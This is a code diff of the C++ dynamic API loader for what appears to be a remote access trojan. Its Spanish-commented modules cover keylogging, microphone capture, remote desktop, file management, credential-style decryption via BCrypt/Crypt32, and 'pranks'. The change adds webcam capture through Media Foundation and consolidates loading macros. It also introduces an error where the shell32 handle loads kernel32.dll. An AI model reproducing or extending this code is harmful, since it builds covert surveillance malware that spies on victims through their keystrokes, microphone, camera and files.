@@ -3,13 +3,12 @@
 
 DynamicLoad::DynamicLoad() {
     //Cargar dlls y funciones
-    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
-    this->hAdvapi32DLL = wrapLoadDLL("advapi32.dll");
-    this->hShell32DLL = wrapLoadDLL("shell32.dll");
-    this->hWtsapi32DLL = wrapLoadDLL("Wtsapi32.dll");
-    this->hPsApiDLL = wrapLoadDLL("psapi.dll");
-    this->hUser32DLL = wrapLoadDLL("user32.dll");
-
+    LOAD_DLL(this->hKernel32DLL, "kernel32.dll");
+    LOAD_DLL(this->hAdvapi32DLL, "advapi32.dll");
+    LOAD_DLL(this->hShell32DLL, "kernel32.dll");
+    LOAD_DLL(this->hWtsapi32DLL, "Wtsapi32.dll");
+    LOAD_DLL(this->hPsApiDLL, "psapi.dll");
+    LOAD_DLL(this->hUser32DLL, "user32.dll");
 
     if (this->hKernel32DLL) {
         this->KERNEL32.pGetComputerName = (st_Kernel32::LPGETCOMPUTERNAMEA)wrapGetProcAddr(this->hKernel32DLL, "GetComputerNameA");
@@ -53,21 +52,13 @@ DynamicLoad::DynamicLoad() {
 
     }
 
-    this->LoadFMProcs(); //Funciones de manipulacion de archivos
-    //this->LoadFunProcs();
-    //this->LoadInfoProcs();
-    //this->LoadKLProcs();
-    //this->LoadMicProcs();
-    //this->LoadRDProcs();
-    //this->LoadWMProcs();
+    this->LoadCamProcs();
 }
 
 //Bromas
 void DynamicLoad::LoadFunProcs() {
-    if (!this->hWinmmDLL) {
-        this->hWinmmDLL = wrapLoadDLL("winmm.dll");
-    }
-
+    LOAD_DLL(this->hWinmmDLL, "winmm.dll");
+    
     if (this->hWinmmDLL) {
         this->WINMM.pMciSendStringA = (st_Winmm::LPMCISENDSTRINGA)wrapGetProcAddr(this->hWinmmDLL, "mciSendStringA");
     }
@@ -80,9 +71,7 @@ void DynamicLoad::LoadFunProcs() {
 }
 
 void DynamicLoad::UnloadFunDlls() {
-    if (this->hWinmmDLL) {
-        wrapFreeLibrary(this->hWinmmDLL);
-    }
+    UNLOAD_DLL(this->hWinmmDLL);
 }
 
 //Administrador de ventanas
@@ -99,7 +88,11 @@ void DynamicLoad::LoadWMProcs() {
 
 //Escritorio Remoto
 void DynamicLoad::LoadRDProcs() {
-    if (!this->hGdi32DLL) {
+    LOAD_DLL(this->hGdi32DLL, "gdi32.dll");
+    LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");
+    LOAD_DLL(this->hOle32, "ole32.dll");
+
+    /*if (!this->hGdi32DLL) {
        this->hGdi32DLL = wrapLoadDLL("gdi32.dll");
     }
     if (!this->hGdiPlusDLL) {
@@ -107,7 +100,7 @@ void DynamicLoad::LoadRDProcs() {
     }
     if (!this->hOle32) {
         this->hOle32 = wrapLoadDLL("ole32.dll");
-    }
+    }*/
 
     if (this->hUser32DLL) {
         this->USER32_RD.pSendInput = (st_User32_RD::LPSENDINPUT)wrapGetProcAddr(this->hUser32DLL, "SendInput");
@@ -141,24 +134,14 @@ void DynamicLoad::LoadRDProcs() {
 }
 
 void DynamicLoad::UnloadRDDlls() {
-    if (this->hGdi32DLL) {
-        wrapFreeLibrary(this->hGdi32DLL);
-    }
-
-    if (this->hGdiPlusDLL) {
-        wrapFreeLibrary(this->hGdiPlusDLL);
-    }
-
-    if (this->hOle32) {
-        wrapFreeLibrary(this->hOle32);
-    }
+    UNLOAD_DLL(this->hGdi32DLL);
+    UNLOAD_DLL(this->hGdiPlusDLL);
+    UNLOAD_DLL(this->hOle32);
 }
 
 //Microfono
 void DynamicLoad::LoadMicProcs() {
-    if (!this->hWinmmDLL) {
-        this->hWinmmDLL = wrapLoadDLL("winmm.dll");
-    }
+    LOAD_DLL(this->hWinmmDLL, "winmm.dll");
 
     if (this->hWinmmDLL) {
         this->WINMMMIC.pWaveInGetDevCapsA = (st_WinmmMic::LPWAVEINGETDEVCAPSA)wrapGetProcAddr(this->hWinmmDLL, "waveInGetDevCapsA");
@@ -174,9 +157,7 @@ void DynamicLoad::LoadMicProcs() {
 }
 
 void DynamicLoad::UnloadMicProcs() {
-    if (this->hWinmmDLL) {
-        wrapFreeLibrary(this->hWinmmDLL);
-    }
+    UNLOAD_DLL(this->hWinmmDLL);
 }
 
 //Keylogger
@@ -201,9 +182,9 @@ void DynamicLoad::LoadKLProcs() {
 
 //Informacion
 void DynamicLoad::LoadInfoProcs() {
-    this->hBCryptDLL = wrapLoadDLL("Bcrypt.dll");
-    this->hCrypt32DLL = wrapLoadDLL("Crypt32.dll");
-    this->hNetApi32DLL = wrapLoadDLL("Netapi32.dll");
+    LOAD_DLL(this->hBCryptDLL, "Bcrypt.dll");
+    LOAD_DLL(this->hCrypt32DLL, "Crypt32.dll");
+    LOAD_DLL(this->hNetApi32DLL, "Netapi32.dll");
 
     if (this->hBCryptDLL) {
         this->BCRYPT.pBCryptDecrypt = (st_Bcrypt::LPBCRYPTDECRYPT)wrapGetProcAddr(this->hBCryptDLL, "BCryptDecrypt");
@@ -224,17 +205,9 @@ void DynamicLoad::LoadInfoProcs() {
 }
 
 void DynamicLoad::UnloadInfoProcs() {
-    if (this->hBCryptDLL) {
-        wrapFreeLibrary(this->hBCryptDLL);
-    }
-
-    if (this->hCrypt32DLL) {
-        wrapFreeLibrary(this->hCrypt32DLL);
-    }
-
-    if (this->hNetApi32DLL) {
-        wrapFreeLibrary(this->hNetApi32DLL);
-    }
+    UNLOAD_DLL(this->hBCryptDLL);
+    UNLOAD_DLL(this->hCrypt32DLL);
+    UNLOAD_DLL(this->hNetApi32DLL);
 }
 
 //Adm archivos
@@ -257,29 +230,80 @@ void DynamicLoad::LoadFMProcs() {
     }
 }
 
+//Camara
+void DynamicLoad::LoadCamProcs() {
+    LOAD_DLL(this->hShlwapiDLL, "Shlwapi.dll");
+    LOAD_DLL(this->hMfplatDLL, "Mfplat.dll");
+    LOAD_DLL(this->hMfDLL, "Mf.dll");
+    LOAD_DLL(this->hMfreadwriteDLL, "Mfreadwrite.dll");
+    LOAD_DLL(this->hOle32, "Ole32.dll");
+    LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");
+
+    if (this->hGdiPlusDLL) {
+        this->GDIPLUS_RD.pGdiplusStartup = (st_GdiPlus::LPGDIPLUSSTARTUP)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusStartup");
+        this->GDIPLUS_RD.pGdiplusShutdown = (st_GdiPlus::LPGDIPLUSSHUTDOWN)wrapGetProcAddr(this->hGdiPlusDLL, "GdiplusShutdown");
+        this->GDIPLUS_RD.pGetImageEncodersSize = (st_GdiPlus::LPGETIMAGEENCODERSSIZE)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncodersSize");
+        this->GDIPLUS_RD.pGetImageEncoders = (st_GdiPlus::LPGETIMAGEENCODERS)wrapGetProcAddr(this->hGdiPlusDLL, "GetImageEncoders");
+        this->GDIPLUS_RD.pFromStream = (st_GdiPlus::LPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "FromStream");
+    }
+
+    if (this->hShlwapiDLL) {
+        this->SHLWAPI.pSHCreateMemStream = (st_Shlwapi::LPSHCREATEMEMSTREAM)wrapGetProcAddr(this->hShlwapiDLL, "SHCreateMemStream");
+    }
+
+    if (this->hMfplatDLL) {
+        this->MFPLAT.pMFCreateAttributes = (st_Mfplat::LPMFCREATEATTRIBUTES)wrapGetProcAddr(this->hMfplatDLL, "MFCreateAttributes");
+        this->MFPLAT.pMFTRegisterLocalByCLSID = (st_Mfplat::LPMFTREGISTERLOCALBYCLSID)wrapGetProcAddr(this->hMfplatDLL, "MFTRegisterLocalByCLSID");
+        this->MFPLAT.pMFCreateMediaType = (st_Mfplat::LPMFCREATEMEDIATYPE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMediaType");
+        this->MFPLAT.pMFCreateSample = (st_Mfplat::LPMFCREATESAMPLE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateSample");
+        this->MFPLAT.pMFCreateMemoryBuffer = (st_Mfplat::LPMFCREATEMEMORYBUFFER)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMemoryBuffer");
+
+        //mfapi
+        this->MFAPI.pMFGetAttributeSize = (st_Mfapi::LPMFGETATTRIBUTESIZE)wrapGetProcAddr(this->hMfplatDLL, "MFGetAttributeSize");
+        this->MFAPI.pMFGetAttributeRatio = (st_Mfapi::LPMFGETATTRIBUTERATIO)wrapGetProcAddr(this->hMfplatDLL, "MFGetAttributeRatio");
+        this->MFAPI.pMFSetAttributeRatio = (st_Mfapi::LPMFSETATTRIBUTERATIO)wrapGetProcAddr(this->hMfplatDLL, "MFSetAttributeRatio");
+        this->MFAPI.pMFSetAttributeSize = (st_Mfapi::LPMFSETATTRIBUTESIZE)wrapGetProcAddr(this->hMfplatDLL, "MFSetAttributeSize");
+    }
+
+    if (this->hMfDLL) {
+        this->MF.pMFEnumDeviceSources = (st_Mf::LPMFENUMDEVICESOURCES)wrapGetProcAddr(this->hMfDLL, "MFEnumDeviceSources");
+    }
+
+    if (this->hMfreadwriteDLL) {
+        this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource =
+            (st_Mfreadwrite::LPMFCREATESOURCEREADERFROMMEDIASOURCE)
+            wrapGetProcAddr(this->hMfreadwriteDLL, "MFCreateSourceReaderFromMediaSource");
+    }
+
+    if (this->hOle32) {
+        this->OLE32.pCoTaskMemFree = (st_Ole32::LPCOTASKMEMFREE)wrapGetProcAddr(this->hOle32, "CoTaskMemFree");
+        this->OLE32.pCoCreateInstance = (st_Ole32::LPCOCREATEINSTANCE)wrapGetProcAddr(this->hOle32, "CoCreateInstance");
+        this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
+
+    }
+}
+
+void DynamicLoad::UnloadCamPros() {
+    //Descargar dlls
+    UNLOAD_DLL(this->hShlwapiDLL);
+    UNLOAD_DLL(this->hMfplatDLL);
+    UNLOAD_DLL(this->hMfDLL);
+    UNLOAD_DLL(this->hMfreadwriteDLL);
+    UNLOAD_DLL(this->hOle32);
+    UNLOAD_DLL(this->hGdiPlusDLL);
+}
+
 DynamicLoad::~DynamicLoad() {
     //Cerrar dlls
-    if (this->hKernel32DLL) {
-        wrapFreeLibrary(this->hKernel32DLL);
-    }
-
-    if (this->hAdvapi32DLL) {
-        wrapFreeLibrary(this->hAdvapi32DLL);
-    }
-
-    if (this->hShell32DLL) {
-        wrapFreeLibrary(this->hShell32DLL);
-    }
-
-    if (this->hWtsapi32DLL) {
-        wrapFreeLibrary(this->hWtsapi32DLL);
-    }
-
-    if (this->hPsApiDLL) {
-        wrapFreeLibrary(this->hPsApiDLL);
-    }
-
-    if (this->hUser32DLL) {
-        wrapFreeLibrary(this->hUser32DLL);
-    }
+    UNLOAD_DLL(this->hKernel32DLL);
+    UNLOAD_DLL(this->hAdvapi32DLL);
+    UNLOAD_DLL(this->hShell32DLL);
+    UNLOAD_DLL(this->hWtsapi32DLL);
+    UNLOAD_DLL(this->hPsApiDLL);
+    UNLOAD_DLL(this->hUser32DLL);
+    this->UnloadFunDlls();
+    this->UnloadInfoProcs();
+    this->UnloadMicProcs();
+    this->UnloadRDDlls();
+    this->UnloadCamPros();
 }
